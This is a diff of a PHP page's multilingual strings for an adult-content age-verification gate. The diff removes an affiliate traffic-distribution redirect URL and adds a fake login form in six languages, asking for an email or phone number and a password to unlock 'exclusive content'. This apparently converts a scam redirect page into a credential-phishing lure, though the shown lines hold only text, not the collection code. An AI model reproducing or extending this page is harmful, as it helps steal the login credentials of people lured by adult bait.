@@ -1,5 +1,4 @@
 <?php
-// Detección automática del idioma del navegador
 $browser_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) : 'es';
 
 $translations = [
@@ -12,7 +11,13 @@ $translations = [
         'loading_text' => 'Verificando edad...',
         'completed_text' => 'Verificación completada para ver el contenido exclusivo',
         'no_access' => 'Acceso restringido para menores de edad.',
-        'url_redirect' => 'https://lov-me-bttr.com/tds/ae?tdsId=s1127pos_r&tds_campaign=s1127pos&s1=ps&utm_source=int&utm_sub=opnfnl&affid=b9915570'
+        'login_title' => 'Iniciar Sesión',
+        'login_alert' => 'Debes iniciar sesión para ver el contenido exclusivo.',
+        'ph_email' => 'Correo electrónico o número de teléfono',
+        'ph_pass' => 'Contraseña',
+        'btn_login' => 'Iniciar Sesión',
+        'btn_login_loading' => 'Entrando...',
+        'forgot_pass' => '¿Has olvidado tu contraseña?'
     ],
     'en' => [
         'title' => 'Are you 18 or older?',
@@ -23,7 +28,13 @@ $translations = [
         'loading_text' => 'Verifying age...',
         'completed_text' => 'Verification completed to view exclusive content',
         'no_access' => 'Restricted access for minors.',
-        'url_redirect' => 'https://lov-me-bttr.com/tds/ae?tdsId=s1127pos_r&tds_campaign=s1127pos&s1=ps&utm_source=int&utm_sub=opnfnl&affid=b9915570'
+        'login_title' => 'Log In',
+        'login_alert' => 'You must log in to view exclusive content.',
+        'ph_email' => 'Email or phone number',
+        'ph_pass' => 'Password',
+        'btn_login' => 'Log In',
+        'btn_login_loading' => 'Logging in...',
+        'forgot_pass' => 'Forgot password?'
     ],
     'pt' => [
         'title' => 'Você tem 18 anos ou mais?',
@@ -34,7 +45,13 @@ $translations = [
         'loading_text' => 'Verificando idade...',
         'completed_text' => 'Verificação concluída para ver o conteúdo exclusivo',
         'no_access' => 'Acesso restrito para menores de idade.',
-        'url_redirect' => 'https://lov-me-bttr.com/tds/ae?tdsId=s1127pos_r&tds_campaign=s1127pos&s1=ps&utm_source=int&utm_sub=opnfnl&affid=b9915570'
+        'login_title' => 'Entrar',
+        'login_alert' => 'Você deve fazer login para ver o conteúdo exclusivo.',
+        'ph_email' => 'Email ou número de telefone',
+        'ph_pass' => 'Senha',
+        'btn_login' => 'Entrar',
+        'btn_login_loading' => 'Entrando...',
+        'forgot_pass' => 'Esqueceu a senha?'
     ],
     'fr' => [
         'title' => 'Avez-vous 18 ans ou plus ?',
@@ -45,7 +62,13 @@ $translations = [
         'loading_text' => 'Vérification de l\'âge...',
         'completed_text' => 'Vérification terminée pour voir le contenu exclusif',
         'no_access' => 'Accès restreint aux mineurs.',
-        'url_redirect' => 'https://lov-me-bttr.com/tds/ae?tdsId=s1127pos_r&tds_campaign=s1127pos&s1=ps&utm_source=int&utm_sub=opnfnl&affid=b9915570'
+        'login_title' => 'Se connecter',
+        'login_alert' => 'Vous devez vous connecter pour voir le contenu exclusif.',
+        'ph_email' => 'E-mail ou numéro de téléphone',
+        'ph_pass' => 'Mot de passe',
+        'btn_login' => 'Se connecter',
+        'btn_login_loading' => 'Connexion...',
+        'forgot_pass' => 'Mot de passe oublié ?'
     ],
     'de' => [
         'title' => 'Sind Sie 18 Jahre oder älter?',
@@ -56,7 +79,13 @@ $translations = [
         'loading_text' => 'Altersüberprüfung...',
         'completed_text' => 'Überprüfung abgeschlossen, um exklusive Inhalte anzusehen',
         'no_access' => 'Zugriff für Minderjährige nicht gestattet.',
-        'url_redirect' => 'https://lov-me-bttr.com/tds/ae?tdsId=s1127pos_r&tds_campaign=s1127pos&s1=ps&utm_source=int&utm_sub=opnfnl&affid=b9915570'
+        'login_title' => 'Anmelden',
+        'login_alert' => 'Sie müssen sich anmelden, um exklusive Inhalte zu sehen.',
+        'ph_email' => 'E-Mail-Adresse oder Telefonnummer',
+        'ph_pass' => 'Passwort',
+        'btn_login' => 'Anmelden',
+        'btn_login_loading' => 'Anmeldung...',
+        'forgot_pass' => 'Passwort vergessen?'
     ],
     'it' => [
         'title' => 'Hai 18 anni o più?',
@@ -67,7 +96,13 @@ $translations = [
         'loading_text' => 'Verifica dell\'età...',
         'completed_text' => 'Verifica completata per visualizzare i contenuti esclusivi',
         'no_access' => 'Accesso vietato ai minori.',
-        'url_redirect' => 'https://lov-me-bttr.com/tds/ae?tdsId=s1127pos_r&tds_campaign=s1127pos&s1=ps&utm_source=int&utm_sub=opnfnl&affid=b9915570'
+        'login_title' => 'Accedi',
+        'login_alert' => 'Devi accedere per visualizzare i contenuti esclusivi.',
+        'ph_email' => 'Email o numero di telefono',
+        'ph_pass' => 'Password',
+        'btn_login' => 'Accedi',
+        'btn_login_loading' => 'Accesso...',
+        'forgot_pass' => 'Password dimenticata?'
     ]
 ];
 
